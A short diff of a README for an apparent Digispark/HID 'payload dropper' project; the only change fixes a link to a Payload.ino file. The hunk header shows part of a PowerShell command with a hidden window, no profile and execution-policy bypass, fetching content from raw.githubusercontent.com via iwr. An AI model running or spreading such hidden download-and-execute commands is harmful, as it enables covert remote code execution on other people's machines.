@@ -11,7 +11,7 @@ powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.
 #### Usage 
 Check out my payload dropper for HIDs or digisparks for this script.
 * [Payload.txt](https://github.com/d0cax/pop-ups/blob/main/Payload.txt)
-* [Payload.ino](https://github.com/d0cax/pop-ups/blob/main/Payload.ino%20for%20Digispark)
+* [Payload.ino](https://github.com/d0cax/pop-ups/blob/main/Payload.ino)
 
 #### Acknowledgments
 
